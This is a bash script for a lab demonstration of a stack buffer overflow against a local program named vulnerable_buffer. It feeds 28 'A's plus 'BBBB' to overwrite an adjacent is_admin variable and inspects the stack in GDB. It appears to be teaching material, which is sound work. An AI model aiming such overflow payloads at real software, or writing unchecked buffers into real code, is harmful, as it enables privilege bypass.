#!/usr/bin/env bash
set -e

DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
BIN="$DIR/vulnerable_buffer"

if [ ! -f "$BIN" ]; then
    echo "[*] Building $BIN..."
    make -C "$DIR"
fi

echo "================================================================="
echo "DEMO 1: Normal Input (No Overflow)"
echo "================================================================="
printf "Hello\n" | "$BIN"

echo ""
echo "================================================================="
echo "DEMO 2: Controlled Adjacent Stack Overwrite (28 'A's + 4 'B's)"
echo "Notice how is_admin changes from 0x00000000 to 0x42424242 ('BBBB')"
echo "================================================================="
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*28 + b"BBBB" + b"\n")' | "$BIN"

echo ""
echo "================================================================="
echo "DEMO 3: Automated GDB Stack Memory Inspection"
echo "================================================================="
python3 -c 'import sys; sys.stdout.buffer.write(b"A"*28 + b"BBBB" + b"\n")' > "$DIR/payload.bin"
gdb -q -x "$DIR/gdb_inspect_memory.gdb" "$BIN" < "$DIR/payload.bin"
rm -f "$DIR/payload.bin"
